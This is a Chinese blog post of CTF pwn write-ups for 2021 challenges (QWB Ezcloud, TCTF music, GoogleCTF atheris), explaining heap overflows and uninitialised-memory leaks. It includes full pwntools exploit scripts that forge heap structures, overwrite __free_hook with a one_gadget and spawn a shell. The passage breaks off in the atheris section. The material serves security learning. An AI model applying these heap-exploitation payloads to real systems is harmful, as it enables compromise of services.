<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>几道有意思的Pwn题的复现 | velta&#39;s blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="CTF">
    <meta name="description" content="0.废话拖了好久终于建了自己的博客，第一篇博客决定先把之前打的几场比赛中我看的但没做出来的题复现了。由于本文的撰写时间与复现时间相隔太久，可能会疏漏一些细节。 1. 2021qwb-Ezcloud本题是一个http服务器程序。sub_9536是比较常规的http报文解析函数，它会返回一个指向解析结果结构体的指针，我们记作parsed_result。对于我们来说需要注意的字段只有Content-Ty">
<meta name="keywords" content="CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="几道有意思的Pwn题的复现">
<meta property="og:url" content="https://veltavid.github.io/2021/08aa1d853a.html">
<meta property="og:site_name" content="velta&#39;s blog">
<meta property="og:description" content="0.废话拖了好久终于建了自己的博客，第一篇博客决定先把之前打的几场比赛中我看的但没做出来的题复现了。由于本文的撰写时间与复现时间相隔太久，可能会疏漏一些细节。 1. 2021qwb-Ezcloud本题是一个http服务器程序。sub_9536是比较常规的http报文解析函数，它会返回一个指向解析结果结构体的指针，我们记作parsed_result。对于我们来说需要注意的字段只有Content-Ty">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://i.loli.net/2021/08/15/xyE6Yf8AoMctP4Q.png">
<meta property="og:image" content="https://i.loli.net/2021/08/15/IbsK3cYBkRvfLy1.png">
<meta property="og:image" content="https://i.loli.net/2021/08/15/iDwrepacdLPIqvG.png">
<meta property="og:image" content="https://i.loli.net/2021/08/15/KNIjPpWbQfCTL62.png">
<meta property="og:image" content="https://i.loli.net/2021/08/15/zINxdoRuBZKYVTg.png">
<meta property="og:image" content="https://i.loli.net/2021/08/15/L32nWKyiPbc1YJp.png">
<meta property="og:image" content="https://i.loli.net/2021/08/15/SYqrL4WPhsUdI9T.png">
<meta property="og:image" content="https://i.loli.net/2021/08/15/5DNPAkBvKH7hqWe.png">
<meta property="og:image" content="https://i.loli.net/2021/08/15/Mk43oUKmhrlYgCb.png">
<meta property="og:image" content="https://i.loli.net/2021/08/15/8DVN2W7fcZdperE.png">
<meta property="og:image" content="https://i.loli.net/2021/08/15/YTzPEUvkKV89jA3.png">
<meta property="og:updated_time" content="2021-08-29T07:07:28.211Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/08/15/xyE6Yf8AoMctP4Q.png">
    
        <link rel="alternate" type="application/atom+xml" title="velta&#39;s blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

</head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">velta</h5>
          <a href="mailto:1020217451@qq.com" target="_blank" rel="noopener" title="1020217451@qq.com" class="mail">1020217451@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/veltavid" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">几道有意思的Pwn题的复现</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">几道有意思的Pwn题的复现</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-08-15T06:23:20.000Z" itemprop="datePublished" class="page-time">
  2021-08-15
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0-废话"><span class="post-toc-number">1.</span> <span class="post-toc-text">0.废话</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-2021qwb-Ezcloud"><span class="post-toc-number">2.</span> <span class="post-toc-text">1. 2021qwb-Ezcloud</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2-2021tctf-music"><span class="post-toc-number">3.</span> <span class="post-toc-text">2. 2021tctf-music</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#3-2021googlectf-atheris"><span class="post-toc-number">4.</span> <span class="post-toc-text">3. 2021googlectf-atheris</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#4-总结"><span class="post-toc-number">5.</span> <span class="post-toc-text">4. 总结</span></a></li></ol>
        </nav>
    </aside>


<article id="post-几道有意思的Pwn题的复现"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">几道有意思的Pwn题的复现</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-08-15 14:23:20" datetime="2021-08-15T06:23:20.000Z"  itemprop="datePublished">2021-08-15</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h4 id="0-废话"><a href="#0-废话" class="headerlink" title="0.废话"></a>0.废话</h4><p>拖了好久终于建了自己的博客，第一篇博客决定先把之前打的几场比赛中我看的但没做出来的题复现了。由于本文的撰写时间与复现时间相隔太久，可能会疏漏一些细节。</p>
<h4 id="1-2021qwb-Ezcloud"><a href="#1-2021qwb-Ezcloud" class="headerlink" title="1. 2021qwb-Ezcloud"></a>1. 2021qwb-Ezcloud</h4><p>本题是一个http服务器程序。sub_9536是比较常规的http报文解析函数，它会返回一个指向解析结果结构体的指针，我们记作parsed_result。对于我们来说需要注意的字段只有Content-Type。当这个字段为application/x-www-form-urlencoded时，则服务器会将我们的报文内容进行url解码，然后把解码后的内容存入parsed_result[11]这个指针指向的堆块，并且parsed_result[13]处会存有数据长度。值得注意的是进行该操作的函数当a3为空时就不会进行任何操作。该函数在之后需要转存数据的地方都会用到，记该函数为strdup_a3_2_a1。</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2021/08/15/xyE6Yf8AoMctP4Q.png" alt="image-20210815150353766" title="">
                </div>
                <div class="image-caption">image-20210815150353766</div>
            </figure>

<p>若该字段内容为multipart/form-data，则不会parsed_result[11]与parsed_result[13]都将为0。</p>
<p>接着看下去，发现POST和GET方式都解析了/notepad这个路径，GET中还有一个/flag路径。</p>
<ul>
<li><p>/flag</p>
<p>/flag对应的处理函数会检查报文中Login-ID字段对应的用户权限是否为1来决定是否输出flag。</p>
<p><img src="https://i.loli.net/2021/08/15/IbsK3cYBkRvfLy1.png" alt="image-20210815152700098"></p>
<p>这里的用户集合使用链表来表示，表示单个用户的结构体如下所示。使用POST方式中的/login可以向用户链表插入用户节点。</p>
<p><img src="https://i.loli.net/2021/08/15/iDwrepacdLPIqvG.png" alt="image-20210815162043550"></p>
<p>因此我们的目标就是伪造一个权限为1的用户节点。</p>
</li>
<li><p>/notepad</p>
<p>这里出现了常规的菜单，如果是POST方式则允许我们增删改note，GET就是显示note内容。漏洞点共有2处，都在new note功能中。</p>
<p>第一个漏洞点是当用户节点中16个note都满了，且next域为空，则还会新增一个note覆盖掉用户节点的next域，这意味着攻击者能够伪造一个用户节点。</p>
<p><img src="https://i.loli.net/2021/08/15/KNIjPpWbQfCTL62.png" alt="image-20210815154000310"></p>
<p>第二个漏洞点在接下来的第一个strdup_a3_2_a1，若我们设置的Content-Type为multipart/form-data，则a1+88处的值为0，那么malloc出来的note就不会被初始化，则note的内容指针可能会指向一块堆块，只要这块堆块上残留了堆块指针，我们就能利用GET方式的notepad泄露出堆块地址。比赛时没发现这个洞，导致瞎堆风水了很久。</p>
<p><img src="https://i.loli.net/2021/08/15/zINxdoRuBZKYVTg.png" alt="image-20210815154449488"></p>
</li>
<li><p>利用思路</p>
<p>本题的难点在于虚假的用户节点内容不可控。因此为了获得可控的用户节点我们需要利用堆风水(玄学)做出一个合适的堆块布局，使得分配完0x20大小的note之后，接下来分配的存储note数据堆块正好在其之后，那么我们就可以覆盖虚假用户节点的next域，使其指向一块我们布置好数据的堆块区域。至于如何做就只能边调边试了，过程比较痛苦。exp如下所示。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(id_u,content,mode)</span>:</span></span><br><span class="line">	<span class="keyword">if</span>(mode==<span class="number">1</span>):</span><br><span class="line">		encoded_content=quote(content)</span><br><span class="line">		base=<span class="string">"POST /notepad HTTP/1.1\r\nContent-Length: %d\r\nContent-Type: application/x-www-form-urlencoded\r\n"</span>%(len(encoded_content))</span><br><span class="line">		base+=<span class="string">"Login-ID: %s\r\nNote-Operation: %s\r\n\r\n"</span>%(quote(id_u),quote(<span class="string">"new note"</span>))</span><br><span class="line">		base+=encoded_content</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		base=<span class="string">"POST /notepad HTTP/1.1\r\nContent-Length: %d\r\nContent-Type: multipart/form-data\r\n"</span>%(len(content))</span><br><span class="line">		base+=<span class="string">"Login-ID: %s\r\nNote-Operation: %s\r\n\r\n"</span>%(quote(id_u),quote(<span class="string">"new note"</span>))</span><br><span class="line">		base+=content</span><br><span class="line">	sh.send(base.ljust(<span class="number">0x10000</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	sh.recvuntil(<span class="string">'operation done!&lt;/p&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(id_u,index)</span>:</span></span><br><span class="line">	base=<span class="string">"POST /notepad HTTP/1.1\r\n"</span></span><br><span class="line">	base+=<span class="string">"Login-ID: %s\r\nNote-ID: %d\r\nNote-Operation: %s\r\n\r\n"</span>%(quote(id_u),index,quote(<span class="string">"delete note"</span>))</span><br><span class="line">	sh.send(base.ljust(<span class="number">0x10000</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	sh.recvuntil(<span class="string">'operation done!&lt;/p&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id_u,index,content)</span>:</span></span><br><span class="line">	encoded_content=quote(content)</span><br><span class="line">	base=<span class="string">"POST /notepad HTTP/1.1\r\nContent-Length: %d\r\nContent-Type: application/x-www-form-urlencoded\r\n"</span>%(len(encoded_content))</span><br><span class="line">	base+=<span class="string">"Login-ID: %s\r\nNote-ID: %d\r\nNote-Operation: %s\r\n\r\n"</span>%(quote(id_u),index,quote(<span class="string">"edit note"</span>))</span><br><span class="line">	base+=encoded_content</span><br><span class="line">	sh.send(base.ljust(<span class="number">0x10000</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(id_u)</span>:</span></span><br><span class="line">	encoded_content=quote(<span class="string">''</span>)</span><br><span class="line">	base=<span class="string">"GET /notepad HTTP/1.1\r\nhost: 123\r\nContent-Length: %d\r\nContent-Type: application/x-www-form-urlencoded\r\n"</span>%(len(encoded_content))</span><br><span class="line">	base+=<span class="string">"Login-ID: %s\r\nNote-Operation: %s\r\n\r\n"</span>%(quote(id_u),quote(<span class="string">"new note"</span>))</span><br><span class="line">	base+=encoded_content</span><br><span class="line">	sh.send(base.ljust(<span class="number">0x10000</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(id_u)</span>:</span></span><br><span class="line">	base=<span class="string">"POST /login HTTP/1.1\r\nContent-Length: 4096\r\nLogin-ID: %s\r\n\r\n"</span>%(id_u)+<span class="string">"a"</span>*<span class="number">0x1000</span></span><br><span class="line">	sh.send(base.ljust(<span class="number">0x10000</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">(id_u)</span>:</span></span><br><span class="line">	base=<span class="string">"POST /logout HTTP/1.1\r\nLogin-ID: %s\r\nContent-Length: 0\r\n\r\n"</span>%(quote(id_u))</span><br><span class="line">	sh.send(base.ljust(<span class="number">0x10000</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">'./EzCloud'</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="string">"1234"</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">"1234"</span>,<span class="string">"a"</span>*<span class="number">0xf000</span>,<span class="number">1</span>)</span><br><span class="line">free(<span class="string">"1234"</span>,<span class="number">0</span>)</span><br><span class="line">print(<span class="string">'0'</span>)</span><br><span class="line">add(<span class="string">"1234"</span>,<span class="string">'a'</span>,<span class="number">0</span>)</span><br><span class="line">print(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="string">"1234"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"&lt;p&gt;\r\n&lt;p&gt;"</span>)</span><br><span class="line">heap_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))&amp;<span class="number">0xfffffffffffff000</span></span><br><span class="line">print(hex(heap_addr))</span><br><span class="line"></span><br><span class="line">login(<span class="string">"12345"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">	add(<span class="string">"12345"</span>,<span class="string">"a"</span>*<span class="number">0x10</span>,<span class="number">1</span>)</span><br><span class="line">	print(i)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">0x60</span>+p64(heap_addr+<span class="number">0x6210</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(heap_addr+<span class="number">0x6220</span>)+<span class="string">"1234567\x00"</span>+p64(<span class="number">7</span>)</span><br><span class="line">add(<span class="string">"12345"</span>,payload.ljust(<span class="number">0x110</span>,<span class="string">'a'</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">base=<span class="string">"GET /flag HTTP/1.1\r\nHost: 192.168.23.131:2333\r\nLogin-ID: 1234567\r\n\r\n"</span></span><br><span class="line">sh.send(base.ljust(<span class="number">0x10000</span>,<span class="string">'\x00'</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="2-2021tctf-music"><a href="#2-2021tctf-music" class="headerlink" title="2. 2021tctf-music"></a>2. 2021tctf-music</h4><p>本题给了一个补丁，将premtx改成了可循环使用的菜单程序。premtx的功能是将mtx格式文件转换成pmx文件，菜单允许我们生成mtx文件，以及将mtx文件转换成pmx文件。</p>
<p>这个项目的源码中使用了大量的strcpy和sprintf，但由于编译保护的关系都无法进行利用，因此我比赛时完全忽略了strcpy，导致一直找不到洞，还是太菜了。实际上漏洞点是multfile.c文件里pushFile函数中的strcpy(newnode-&gt;actualfile_NAME, filename)，由于编译器无法推断newnode-&gt;actualfile_NAME的长度，自然也无法进行保护。</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2021/08/15/L32nWKyiPbc1YJp.png" alt="image-20210815164242464" title="">
                </div>
                <div class="image-caption">image-20210815164242464</div>
            </figure>

<ul>
<li><p>泄露libc地址</p>
<p>查看手册可知，用include命令可以将任意文件包含到mtx文件中，然后开启debugMode就会输出文件的内容，造成任意文件读，当然我们不能读取flag文件，但我们可以读/proc/self/maps来泄露出libc地址。</p>
</li>
<li><p>堆风水</p>
<p>这题又需要使用堆风水构造出一个合适的布局，使得在一次转换中就能够实现堆块fd的改写与任意地址写。本题比上一题好的地方在于使用malloc与calloc的地方并不多，因此我们不需要靠玄学了。</p>
<p>总结一下可控的会使用alloc相关函数的地方有：</p>
<ul>
<li>multfile.c中的pushFile使用了malloc，分配堆块大小为0x1a0</li>
<li>两个菜单函数都使用了calloc</li>
<li>fopen固定分配0x1e0大小的堆块</li>
</ul>
<p>可控的free有：</p>
<ul>
<li>pushFile中打开文件失败时</li>
<li>multifile.c的popFile中</li>
<li>2个菜单函数的末尾</li>
<li>fclose</li>
</ul>
<p>实际调试时发现还会分配一些大于0x1000的堆块，但是影响不大就没分析是哪分配的了。为了避免这个影响我们先利用菜单的upload功能calloc一个0x1000大小的堆块，紧接着upload就会调用fopen分配一个0x1e0大小的堆块，0x1e0会进入tcache，所以最终0x1000大小堆块会进入unsorted bin。</p>
<p>然后我们再分配一些0x1e0大小的堆块专门提供给fopen使用，免得之后mtx转换pmx时导致我们的堆块不相邻。</p>
<p>为了任意写，我们需要保证0x1a0大小堆块的分配顺序是按从低到高地址来的，这样才能够溢出改fd并分配出我们想要的地址。由于溢出点是actualfile_NAME字段，我们可以控制include一个超长名字的文件来触发，所以发生溢出的堆块是第二块，因此我们需要布置的0x1a0大小堆块数目为3+1。上述顺序正好匹配了栈的特点，构造一个深度为4的文件栈就能够布置好tcache。我们总共需要调用3次转换函数，第一次用于泄露libc地址。第一次转换后堆块布局如下图所示。</p>
<p><img src="https://i.loli.net/2021/08/15/SYqrL4WPhsUdI9T.png" alt="image-20210815174134688"></p>
<p>第二次用于篡改fd，文件栈的深度为2。</p>
<p><img src="https://i.loli.net/2021/08/15/5DNPAkBvKH7hqWe.png" alt="image-20210815174159342"></p>
<p>最后构造一个深度为4的文件栈即可改free_hook为one_gadget拿shell。</p>
</li>
<li><p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	sh.sendafter(<span class="string">"choice:"</span>,<span class="string">'1'</span>)</span><br><span class="line">	sh.sendafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line">	sh.recvuntil(<span class="string">'Your filename: '</span>)</span><br><span class="line">	file_name=sh.recvline()[:<span class="number">-1</span>]</span><br><span class="line">	sh.sendafter(<span class="string">'length:'</span>,str(len(content)))</span><br><span class="line">	sh.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line">	<span class="keyword">return</span> file_name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span><span class="params">(index,if_libc,if_ok)</span>:</span></span><br><span class="line">	sh.sendafter(<span class="string">"choice:"</span>,<span class="string">'2'</span>)</span><br><span class="line">	sh.sendafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line">	<span class="keyword">if</span>(if_libc):</span><br><span class="line">		res=sh.recvuntil(<span class="string">'/usr/lib/x86_64-linux-gnu'</span>).split(<span class="string">'\n'</span>)[<span class="number">-1</span>]</span><br><span class="line">		libc_base=int(res[<span class="number">5</span>:<span class="number">17</span>],<span class="number">16</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		libc_base=<span class="literal">None</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">not</span> if_ok):</span><br><span class="line">		sh.sendafter(<span class="string">'?[y/n]'</span>,<span class="string">'y'</span>)</span><br><span class="line">	<span class="keyword">return</span> libc_base</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_f</span><span class="params">(index,path,size)</span>:</span></span><br><span class="line">	content=<span class="string">"""Honky-Tonk: Voices RL LL AL BL CL DL EL FL GL HL IL JL; Clefs G F 1 2 3 4 5 6 7 8 9 10; Continuo</span></span><br><span class="line"><span class="string">Style: Honky-Tonk</span></span><br><span class="line"><span class="string">Name: Piano</span></span><br><span class="line"><span class="string">Meter: 4/4</span></span><br><span class="line"><span class="string">size: 29</span></span><br><span class="line"><span class="string">%% w120m</span></span><br><span class="line"><span class="string">enable: ignoreErrors</span></span><br><span class="line"><span class="string">enable: debugMode</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">	content+=<span class="string">"include:%s\n\n"</span>%(path)</span><br><span class="line">	c_len=len(content)</span><br><span class="line">	<span class="keyword">while</span>(c_len&lt;size):</span><br><span class="line">		content+=<span class="string">"g"</span>*<span class="number">14</span>+<span class="string">"|\n"</span></span><br><span class="line">		c_len+=<span class="number">16</span></span><br><span class="line">	file_name=add(index,content)</span><br><span class="line">	<span class="keyword">return</span> file_name</span><br><span class="line"></span><br><span class="line">lib=ELF(<span class="string">'/usr/lib/x86_64-linux-gnu/libc-2.31.so'</span>)</span><br><span class="line">sh=process(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#sh=remote('127.0.0.1',12580)</span></span><br><span class="line"><span class="comment">#sh=remote('111.186.58.135',12580)</span></span><br><span class="line"></span><br><span class="line">f4=gen_f(<span class="number">4</span>,<span class="string">'/bin/sh'</span>,<span class="number">0x1000</span>)</span><br><span class="line">f0=gen_f(<span class="number">0</span>,<span class="string">'/proc/self/maps'</span>,<span class="number">0x1d0</span>)</span><br><span class="line">f1=gen_f(<span class="number">1</span>,<span class="string">'./'</span>+f0,<span class="number">0x1d0</span>)</span><br><span class="line">f2=gen_f(<span class="number">2</span>,<span class="string">'./'</span>+f1,<span class="number">0x1d0</span>)</span><br><span class="line"></span><br><span class="line">libc_base=gen(<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">free_hook=libc_base+lib.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">malloc_hook=libc_base+lib.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system_addr=libc_base+lib.sym[<span class="string">'system'</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0xe6e73</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">142</span>+p64(free_hook<span class="number">-0x120</span>)[:<span class="number">6</span>]</span><br><span class="line">payload2=<span class="string">'/bin/sh;'</span>+<span class="string">'a'</span>*<span class="number">6</span>+p64(one_gadget)[:<span class="number">6</span>]</span><br><span class="line">gen_f(<span class="number">3</span>,payload,<span class="number">0x250</span>)</span><br><span class="line">gen(<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">f5=gen_f(<span class="number">5</span>,payload2,<span class="number">0x200</span>)</span><br><span class="line">f6=gen_f(<span class="number">6</span>,f5,<span class="number">0x200</span>)</span><br><span class="line">gen_f(<span class="number">7</span>,f6,<span class="number">0x200</span>)</span><br><span class="line">gen(<span class="number">7</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="3-2021googlectf-atheris"><a href="#3-2021googlectf-atheris" class="headerlink" title="3. 2021googlectf-atheris"></a>3. 2021googlectf-atheris</h4><p>本题是一个python写的服务器，它会接收一个zip压缩包。然后调用find_valid_autorun筛选出符合要求的py文件，随后运行它。</p>
<ul>
<li><p>find_valid_autorun</p>
<p>先使用zipfile库获取压缩包的内容信息，依次进行如下检验：</p>
<ul>
<li>文件名不能为空</li>
<li>文件名第一位不能为’/‘，也就是不能为绝对路径</li>
<li>文件名中不能包含’..’</li>
<li>文件类型不能为链接文件</li>
<li>不能包含Xceed Unicode Extra Field</li>
<li>不能包含Unicode Path Extra Field</li>
</ul>
<p>然后筛选出文件名以.autorun.py结尾的文件，然后获取.autorun.py前的87个字符，当成是base64编码后的签名，不是4的倍数是因为多取了一个’.’，再加上2个等号就是4的倍数了。若签名验证通过则会返回这个文件名。</p>
</li>
<li><p>解压运行</p>
<p>调用turbozipfile库解压zip压缩包，然后运行通过了检验的.autorun.py文件。</p>
</li>
<li><p>解题思路</p>
